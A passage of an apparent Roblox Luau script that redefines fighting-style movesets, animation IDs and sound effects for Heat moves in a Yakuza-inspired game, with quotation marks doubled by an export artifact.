v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack2'
v.Name = ""Rush5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush6"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack3'
v.Name = ""Rush6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush7"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush8"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack4'
v.Name = ""Rush8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'RStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike1'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Strike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike6"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike6""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'BStrike4'
v.Name = ""Strike6""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike7"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike7""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike4'
v.Name = ""Strike7""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike8"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike8""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike3'
v.Name = ""Strike8""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike9"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike9""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍2Strike4'
v.Name = ""Strike9""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Rush[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = '龍Attack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Rush[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'B2Strike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_Running4"") then
v = game.ReplicatedStorage.Styles.Rush[""H_Running4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Terror'
v.Name = ""H_Running4""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_AirFallen"") then
v = game.ReplicatedStorage.Styles.Rush[""H_AirFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_Whirl'
v.Name = ""H_AirFallen""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Rush[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'T_CounterQuickstep'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Rush.GrabStrike:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Rush.GrabStrike[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush.GrabStrike)
end
v.Value = 'Counter Quickstep'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Rush[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FallenKick'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedB"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkBack'
v.Name = ""H_EvadedB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710466763""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468004""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710467557""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710468479""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568545""
v.Name = ""EvadeCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11710568875""
v.Name = ""EvadeCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632563534""
v.Name = ""EvadeQCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632565056""
v.Name = ""EvadeQCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCL"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564616""
v.Name = ""EvadeQCL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeQCR"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeQCR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11632564233""
v.Name = ""EvadeQCR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCF"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716395378""
v.Name = ""EvadeCF""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""EvadeCB"") then
v = game.ReplicatedStorage.Styles.Rush[""EvadeCB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11716396028""
v.Name = ""EvadeCB""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11776345813""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedR"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedR""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkRight'
v.Name = ""H_EvadedR""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""H_EvadedL"") then
v = game.ReplicatedStorage.Styles.Rush[""H_EvadedL""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Rush)
end
v.Value = 'H_FastFootworkLeft'
v.Name = ""H_EvadedL""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Rush[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://12120045620""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Rush.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Rush.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Rush.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Rush[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://11959653217""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Rush:FindFirstChild(""Run"") then
v = game.ReplicatedStorage.Styles.Rush[""Run""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Rush)
end

v.AnimationId = ""rbxassetid://13731641248""
v.Name = ""Run""

if game.ReplicatedStorage.Styles:FindFirstChild(""Beast"") then
v = game.ReplicatedStorage.Styles[""Beast""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end
v.Name = ""Beast""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Beast[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 0.75
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""StartBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""StartBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920901524""
v.Name = ""StartBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GuardGrabHit"") then
v = game.ReplicatedStorage.Styles.Beast[""GuardGrabHit""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BearHug'
v.Name = ""GuardGrabHit""
if game.ReplicatedStorage.Styles.Beast.GuardGrabHit:FindFirstChild(""Ability"") then
v = game.ReplicatedStorage.Styles.Beast.GuardGrabHit[""Ability""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast.GuardGrabHit)
end
v.Value = 'Bear Hug'
v.Name = ""Ability""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Beast[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTPunch3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Beast[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = Color3.fromRGB(255, 240, 31)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Beast[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BTStrike4'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Beast[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeB"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeB""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916809""
v.Name = ""EvadeB""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Beast[""RedHeat""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Beast[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'Beast'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Beast[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeR"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeR""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeR""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Beast[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Piledriver'
v.Name = ""H_GrabStanding""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_AbsorbBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""H_AbsorbBlock""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Torment'
v.Name = ""H_AbsorbBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_TwoHandeds"") then
v = game.ReplicatedStorage.Styles.Beast[""H_TwoHandeds""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_SelfDestruct'
v.Name = ""H_TwoHandeds""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabLeg"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabLeg""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Swing'
v.Name = ""H_GrabLeg""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Taunt"") then
v = game.ReplicatedStorage.Styles.Beast[""Taunt""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'BeastTaunt'
v.Name = ""Taunt""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit2Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit2Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920909417""
v.Name = ""Hit2Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EndBlock"") then
v = game.ReplicatedStorage.Styles.Beast[""EndBlock""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920912941""
v.Name = ""EndBlock""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Hit1Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Hit1Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920902836""
v.Name = ""Hit1Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Block"") then
v = game.ReplicatedStorage.Styles.Beast[""Block""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://10920916315""
v.Name = ""Block""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabOnFallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabOnFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_LobCrush'
v.Name = ""H_GrabOnFallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Stunned"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Stunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Knockout'
v.Name = ""H_Stunned""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""HThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""HThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_HeavyToss'
v.Name = ""HThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""LHThrow"") then
v = game.ReplicatedStorage.Styles.Beast[""LHThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'T_BHeavyToss'
v.Name = ""LHThrow""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_FallenDown"") then
v = game.ReplicatedStorage.Styles.Beast[""H_FallenDown""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenGrate'
v.Name = ""H_FallenDown""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_Fallen"") then
v = game.ReplicatedStorage.Styles.Beast[""H_Fallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_Fallen""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeF"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeF""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://11614916023""
v.Name = ""EvadeF""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""EvadeL"") then
v = game.ReplicatedStorage.Styles.Beast[""EvadeL""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://8223592585""
v.Name = ""EvadeL""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""Idle"") then
v = game.ReplicatedStorage.Styles.Beast[""Idle""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Styles.Beast)
end

v.AnimationId = ""rbxassetid://13794669255""
v.Name = ""Idle""
if game.ReplicatedStorage.Styles.Beast.Idle:FindFirstChild(""Core"") then
v = game.ReplicatedStorage.Styles.Beast.Idle[""Core""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Beast.Idle)
end
v.Name = ""Core""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_GrabStanding3"") then
v = game.ReplicatedStorage.Styles.Beast[""H_GrabStanding3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_Entangle'
v.Name = ""H_GrabStanding3""
if game.ReplicatedStorage.Styles.Beast:FindFirstChild(""H_StunnedFront"") then
v = game.ReplicatedStorage.Styles.Beast[""H_StunnedFront""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Beast)
end
v.Value = 'H_KnockoutFront'
v.Name = ""H_StunnedFront""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""龍TigerDrop""]:FindFirstChild(""ForceSF"") then
v = game.ReplicatedStorage.Moves[""龍TigerDrop""][""ForceSF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Moves[""龍TigerDrop""])
end
v.Value = '0.1' 
v.Name = ""ForceSF""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""Anim"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""Anim""]
else
v = Instance.new(""Animation"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.AnimationId = ""rbxassetid://12338275115"" 
v.Name = ""Anim""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""HitDur"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""HitDur""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 0.3 
v.Name = ""HitDur""
if game.ReplicatedStorage.Moves[""TigerDrop""]:FindFirstChild(""AniSpeed"") then
v = game.ReplicatedStorage.Moves[""TigerDrop""][""AniSpeed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Moves[""TigerDrop""])
end
v.Value = 1 
v.Name = ""AniSpeed""


local function playsound(id)
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://""..tostring(id)

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(sfx.TimeLength)
		sfx:Destroy()
	end)
end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://4843088994""

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		task.wait(2)
		sfx:Destroy()
	end)
end

local function play_ingamesound(sfxname)
	local v = game.ReplicatedStorage.Sounds:FindFirstChild(sfxname)
	local sfx = Instance.new(""Sound"", nil)
	local id = v.Value

	sfx.SoundId = id

	for i,v in v:GetChildren() do
		sfx[v.Name] = v.Value
	end

	game.SoundService:PlayLocalSound(sfx)
	task.delay(15, function()
		sfx:Destroy()
	end)
end

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Ultimate Essence"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
	play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        play_ingamesound(""Laugh"")
        task.wait(0.4)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""BoneBreak"")
	play_ingamesound(""MassiveSlap"")

        task.wait(0.3)
        Anim:Destroy()
    end
end)


local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fast Footwork [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Fisticuffs"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_UltimateEssence.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_UltimateEssence.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Ignite"")
        play_ingamesound(""Ignite"")
        task.wait(0.3)
        play_ingamesound(""TakeAim"")
        task.wait(0.6)
        play_ingamesound(""Slap"")
        task.wait(0.9)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Whirl"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_KnockoutFront.MoveName.Value
        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_KnockoutFront.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""MetalBonk"")
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalSmack"")
        task.wait(0.1)
        play_ingamesound(""MetalPipe"")
        task.wait(0.1)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)

local Player = game.Players.LocalPlayer
local Rep = game.ReplicatedStorage
local Char = Player.Character
local Main = Player.PlayerGui.Interface.Battle.Main

Main.HeatMove.TextLabel:GetPropertyChangedSignal(""Text""):Connect(function()
    if Main.HeatMove.TextLabel.Text == ""Essence of Frenzy [Back]"" then
        Main.HeatMove.TextLabel.Text = Rep.Moves.H_SumoSlap.MoveName.Value
